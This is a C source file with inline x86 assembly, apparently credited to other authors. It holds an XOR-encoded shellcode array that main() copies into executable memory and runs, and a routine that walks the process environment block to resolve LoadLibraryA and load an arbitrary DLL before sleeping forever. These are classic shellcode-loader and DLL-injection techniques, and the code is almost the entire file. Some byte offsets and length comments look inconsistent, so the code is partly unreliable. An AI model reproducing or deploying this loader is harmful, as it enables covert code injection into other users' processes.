/*
    based on lamgublin's code modified by zaza6677@kshom

*/
#include <Windows.h>
//Original shellcode for a simple decode (xor 0xAB)
UCHAR ShellCode[337] = {
    0xEB, 0x03, 0x58, 0x50, 0xC3, 0x60, 0x33, 0xC9, 0xE8, 0xF5, 0xFF, 0xFF,
    0xFF, 0x83, 0xC0, 0x1A, 0x66, 0x8B, 0x1C, 0x08, 0x66, 0x81, 0xF3, 0xAB,
    0x00, 0x66, 0x89, 0x1C, 0x08, 0x41, 0x81, 0xF9, 0x95, 0x02, 0x00, 0x00,
    0x75, 0xEA, 0x61, 0xCB, 0x37, 0xCF, 0x0A, 0x9B, 0xAB, 0xAB, 0xAB, 0x20,
    0xEB, 0xA7, 0x20, 0xEB, 0xB7, 0x20, 0xAB, 0x20, 0xF3, 0x8B, 0x20, 0xF0,
    0xA0, 0x2A, 0x50, 0xAB, 0x98, 0xAB, 0x99, 0xDE, 0x5B, 0x98, 0x70, 0x20,
    0xEB, 0xA3, 0x20, 0x63, 0x20, 0xEB, 0x97, 0xA8, 0x6A, 0x20, 0xEB, 0xD3,
    0xA8, 0x6A, 0xFB, 0xFA, 0x20, 0xF3, 0x8B, 0xA8, 0x72, 0x98, 0x5D, 0x98,
    0x79, 0x98, 0x54, 0x20, 0xBF, 0x18, 0x20, 0x52, 0xA8, 0x51, 0xED, 0xCD,
    0x20, 0xFC, 0xA1, 0xCD, 0x2A, 0x51, 0xD2, 0xEA, 0xDE, 0x42, 0xCD, 0x20,
    0xBC, 0xCD, 0x2A, 0x51, 0xE7, 0xC4, 0xDE, 0x74, 0x20, 0xF3, 0xB7, 0x20,
    0x7A, 0xA8, 0x72, 0xE5, 0x20, 0xB7, 0x18, 0x20, 0x7A, 0xA8, 0x78, 0x28,
    0x47, 0x9B, 0x6D, 0xAF, 0x8F, 0xC8, 0x6D, 0xEF, 0x8F, 0xAA, 0xC3, 0x6D,
    0xEF, 0x8F, 0xA9, 0xD9, 0x6D, 0xEF, 0x8F, 0xA8, 0xC4, 0x6D, 0xEF, 0x8F,
    0xAF, 0xC6, 0x6D, 0xEF, 0x8F, 0xAE, 0xCE, 0x6D, 0xEF, 0x8F, 0xAD, 0xF4,
    0x6D, 0xEF, 0x8F, 0xAC, 0xCD, 0x6D, 0xEF, 0x8F, 0xA3, 0xD9, 0x6D, 0xEF,
    0x8F, 0xA2, 0xCA, 0x6D, 0xEF, 0x8F, 0xA1, 0xC6, 0x6D, 0xEF, 0x8F, 0xA0,
    0xCE, 0x6D, 0xEF, 0x8F, 0xA7, 0xF4, 0x6D, 0xEF, 0x8F, 0xA6, 0xC3, 0x6D,
    0xEF, 0x8F, 0xA5, 0xCE, 0x6D, 0xEF, 0x8F, 0xA4, 0xC7, 0x6D, 0xEF, 0x8F,
    0xBB, 0xDB, 0x6D, 0xEF, 0x8F, 0xBA, 0xCE, 0x6D, 0xEF, 0x8F, 0xB9, 0xD9,
    0x6D, 0xEF, 0x8F, 0xB8, 0x85, 0x6D, 0xEF, 0x8F, 0xBF, 0xCF, 0x6D, 0xEF,
    0x8F, 0xBE, 0xC7, 0x6D, 0xEF, 0x8F, 0xBD, 0xC7, 0x6D, 0xEF, 0x8F, 0xBC,
    0xAB, 0xFF, 0x54, 0x79, 0x28, 0x6F, 0x9B, 0x3B, 0x3B, 0xF2, 0xF3, 0x20,
    0xF3, 0x8B, 0xA8, 0x72, 0x98, 0x5D, 0x98, 0x79, 0x98, 0x54, 0x20, 0xBF,
    0x18, 0x20, 0x52, 0xA8, 0x51, 0xED, 0xCD, 0x20, 0xFC, 0xA8, 0xCD, 0x2A,
    0x51, 0xCE, 0xDB, 0xDE, 0x42, 0xCD, 0x20, 0xBC, 0xCD, 0x2A, 0x51, 0xF8,
    0xC7, 0xDE, 0x74, 0x20, 0xF3, 0xB7, 0xA8, 0x72, 0xE5, 0x20, 0xB7, 0x18,
    0x20, 0x7A, 0xA8, 0x78, 0xC1, 0x54, 0x54, 0x79, 0x36, 0xCA, 0x90, 0x90,
    0x90}; 
// Shellcode: The Base Code Xor 0xab total 0x296 bytes
// LoadLibraryA("chrome_frame_helper.dll")

typedef void (*CODE)(void);
int main(void) {
  CODE code;
  PVOID buf = VirtualAlloc(NULL, 1000, MEM_RESERVE | MEM_COMMIT,
                           PAGE_EXECUTE_READWRITE);
  memcpy(buf, ShellCode, sizeof(ShellCode));
  code = (CODE)buf;
  code();
  /*__asm
  {
          jmp start;
  get_eip:
          pop eax;
          push eax;
          ret;
  start:
          pushad;
          xor ecx, ecx;
          call get_eip;
          add eax, 0x1A;
  decrypt:
          mov bx, [eax + ecx];
          xor bx, 0xab;
          mov[eax + ecx], bx;
          inc ecx;
          cmp ecx, 0x295;
          jne decrypt;
          popad
          data :
          _emit 0xcb
                  _emit 0x37
                  _emit 0xcf
                  _emit 0x0a
                  _emit 0x9b
                  _emit 0xab
                  _emit 0xab
                  _emit 0xab
                  _emit 0x20
                  _emit 0xeb
                  _emit 0xa7
                  _emit 0x20
                  _emit 0xeb
                  _emit 0xb7
                  _emit 0x20
                  _emit 0xab
                  _emit 0x20
                  _emit 0xf3
                  _emit 0x8b
                  _emit 0x20
                  _emit 0xf0
                  _emit 0xa0
                  _emit 0x2a
                  _emit 0x50
                  _emit 0xab
                  _emit 0x98
                  _emit 0xab
                  _emit 0x99
                  _emit 0xde
                  _emit 0x5b
                  _emit 0x98
                  _emit 0x70
                  _emit 0x20
                  _emit 0xeb
                  _emit 0xa3
                  _emit 0x20
                  _emit 0x63
                  _emit 0x20
                  _emit 0xeb
                  _emit 0x97
                  _emit 0xa8
                  _emit 0x6a
                  _emit 0x20
                  _emit 0xeb
                  _emit 0xd3
                  _emit 0xa8
                  _emit 0x6a
                  _emit 0xfb
                  _emit 0xfa
                  _emit 0x20
                  _emit 0xf3
                  _emit 0x8b
                  _emit 0xa8
                  _emit 0x72
                  _emit 0x98
                  _emit 0x5d
                  _emit 0x98
                  _emit 0x79
                  _emit 0x98
                  _emit 0x54
                  _emit 0x20
                  _emit 0xbf
                  _emit 0x18
                  _emit 0x20
                  _emit 0x52
                  _emit 0xa8
                  _emit 0x51
                  _emit 0xed
                  _emit 0xcd
                  _emit 0x20
                  _emit 0xfc
                  _emit 0xa1
                  _emit 0xcd
                  _emit 0x2a
                  _emit 0x51
                  _emit 0xd2
                  _emit 0xea
                  _emit 0xde
                  _emit 0x42
                  _emit 0xcd
                  _emit 0x20
                  _emit 0xbc
                  _emit 0xcd
                  _emit 0x2a
                  _emit 0x51
                  _emit 0xe7
                  _emit 0xc4
                  _emit 0xde
                  _emit 0x74
                  _emit 0x20
                  _emit 0xf3
                  _emit 0xb7
                  _emit 0x20
                  _emit 0x7a
                  _emit 0xa8
                  _emit 0x72
                  _emit 0xe5
                  _emit 0x20
                  _emit 0xb7
                  _emit 0x18
                  _emit 0x20
                  _emit 0x7a
                  _emit 0xa8
                  _emit 0x78
                  _emit 0x28
                  _emit 0x47
                  _emit 0x9b
                  _emit 0x6d
                  _emit 0xaf
                  _emit 0x8f
                  _emit 0xc8
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xaa
                  _emit 0xc3
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa9
                  _emit 0xd9
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa8
                  _emit 0xc4
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xaf
                  _emit 0xc6
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xae
                  _emit 0xce
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xad
                  _emit 0xf4
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xac
                  _emit 0xcd
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa3
                  _emit 0xd9
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa2
                  _emit 0xca
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa1
                  _emit 0xc6
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa0
                  _emit 0xce
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa7
                  _emit 0xf4
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa6
                  _emit 0xc3
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa5
                  _emit 0xce
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xa4
                  _emit 0xc7
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xbb
                  _emit 0xdb
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xba
                  _emit 0xce
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xb9
                  _emit 0xd9
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xb8
                  _emit 0x85
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xbf
                  _emit 0xcf
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xbe
                  _emit 0xc7
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xbd
                  _emit 0xc7
                  _emit 0x6d
                  _emit 0xef
                  _emit 0x8f
                  _emit 0xbc
                  _emit 0xab
                  _emit 0xff
                  _emit 0x54
                  _emit 0x79
                  _emit 0x28
                  _emit 0x6f
                  _emit 0x9b
                  _emit 0x3b
                  _emit 0x3b
                  _emit 0xf2
                  _emit 0xf3
                  _emit 0x20
                  _emit 0xf3
                  _emit 0x8b
                  _emit 0xa8
                  _emit 0x72
                  _emit 0x98
                  _emit 0x5d
                  _emit 0x98
                  _emit 0x79
                  _emit 0x98
                  _emit 0x54
                  _emit 0x20
                  _emit 0xbf
                  _emit 0x18
                  _emit 0x20
                  _emit 0x52
                  _emit 0xa8
                  _emit 0x51
                  _emit 0xed
                  _emit 0xcd
                  _emit 0x20
                  _emit 0xfc
                  _emit 0xa8
                  _emit 0xcd
                  _emit 0x2a
                  _emit 0x51
                  _emit 0xce
                  _emit 0xdb
                  _emit 0xde
                  _emit 0x42
                  _emit 0xcd
                  _emit 0x20
                  _emit 0xbc
                  _emit 0xcd
                  _emit 0x2a
                  _emit 0x51
                  _emit 0xf8
                  _emit 0xc7
                  _emit 0xde
                  _emit 0x74
                  _emit 0x20
                  _emit 0xf3
                  _emit 0xb7
                  _emit 0xa8
                  _emit 0x72
                  _emit 0xe5
                  _emit 0x20
                  _emit 0xb7
                  _emit 0x18
                  _emit 0x20
                  _emit 0x7a
                  _emit 0xa8
                  _emit 0x78
                  _emit 0xc1
                  _emit 0x54
                  _emit 0x54
                  _emit 0x79
                  _emit 0x36
                  _emit 0xca
                  nop;
                  nop;
                  nop;
                  nop;
}*/
  return 0;
}
void WriteByASM_EndBySleep() {
  __asm {
		pushad;
		pushfd;
		mov eax, fs:[0x30]; // get PEB 
		mov eax, [eax + 0x0c];                // get LDR
		mov eax, [eax + 0x1c]; // get modulelistfirst
	find_kernel32:
		mov eax, [eax];            // get kernel32.dll
		mov ebx, [eax + 0x20];
		mov ebx, [ebx + 0xb];
		cmp ebx, 0x32003300;
		jne find_kernel32;
		xor ebx, ebx;
	find_kernel32_end:
		mov eax, [eax + 0x08]; // get dll address
		mov ecx, eax; // ecx:PE shart address  
		mov eax, [eax + 0x3c]; // PE RVA
		add eax, ecx;
		mov eax, [eax + 0x78];
		add eax, ecx;       // eax:exporttable entry
		push eax;
		push ecx;
		mov ebx, [eax + 0x20];
		add ebx, ecx;       // ebx:address namearray entry
		xor esi, esi;
	find_lib:
		xor edx, edx;
		xor edi, edi;
		mov edx, [ebx + esi * 4];
		mov edi, ecx;
		add edi, edx;
		inc esi;
		mov dx, [edi + 8h + 2h];
		cmp dx, 4179h;
		jne find_lib;
		mov dx, [edi];
		cmp dx, 6f4ch;
		jne find_lib;
	find_lib_end:
		mov ebx, [eax + 0x1c]; // ebx:addressarray entry RVA
		mov edx,ecx;
		add ebx, ecx;
        dec esi;
		mov ebx, [ebx + esi * 4];
		mov edx, ecx;
		add edx, ebx; // edx:LoadLibraryA Function Address
		sub esp,0x30;
		mov[esp], 0x7a;     // z      char *a = zaza6677.dll"
		mov[esp + 1], 0x61; // a 
		mov[esp + 2], 0x7a; // z
		mov[esp + 3], 0x61; // a
		mov[esp + 4], 0x36; // 6
		mov[esp + 5], 0x36; // 6
		mov[esp + 6], 0x37; // 7
		mov[esp + 7], 0x37; // 7 
		mov[esp + 19], 0x2e; //.
		mov[esp + 20], 0x64; // d
		mov[esp + 21], 0x6c; // l
		mov[esp + 22], 0x6c; // l
		mov[esp + 23], 0x00;
	    push esp;
		call edx; // LoadLibraryA("zaza6677.dll")
		add esp,0x30
		nop;
		nop;
		pop ecx; // can be modified for ExitProcess 
		pop eax;
		mov ebx, [eax + 0x20];
		add ebx, ecx; // ebx:address namearray entry
		xor esi, esi;
	find_lib1:
		xor edx, edx;
		xor edi, edi;
		mov edx, [ebx + esi * 4];
		mov edi, ecx;
		add edi, edx;
		inc esi;
		mov dx, [edi + 0x3];
		cmp dx, 7065h;
		jne find_lib1;
		mov dx, [edi];
		cmp dx, 6C53h;
		jne find_lib1;
	find_lib_end1:
		mov ebx, [eax + 0x1c];
		add ebx, ecx;
		dec esi;
		mov ebx, [ebx + esi * 4];
		mov edx, ecx;
		add edx, ebx;; edx:Sleep
		push 0xFFFFFFFF;
		call edx;; Sleep(INFINITE)
		popfd;
		popad;
  }
}
/*
pop ecx;
pop eax;
mov ebx, [eax + 0x20];
add ebx, ecx;                          ; ebx:address namearray entry
xor esi, esi;
find_lib1:
xor edx, edx;
xor edi, edi;
mov edx, [ebx + esi * 4];
mov edi, ecx;
add edi, edx;
inc esi;
mov dx, [edi + 0x9];
cmp dx, 7373h;
jne find_lib1;
mov dx, [edi];
cmp dx, 7845h;
jne find_lib1;
find_lib_end1:
mov ebx, [eax + 0x1c];
add ebx, ecx;
mov ebx, [ebx + esi * 4];
mov edx, ecx;
add edx, ebx;                           ;edx:ExitProcess
push 0x0;
call edx;                               ;Exitprocess(0)
popfd;
popad;
*/
/*printf("%x", (unsigned long)&((IMAGE_NT_HEADERS
 * *)(0))->OptionalHeader.DataDirectory - (unsigned long)&((IMAGE_NT_HEADERS
 * *)(0))->Signature);*/
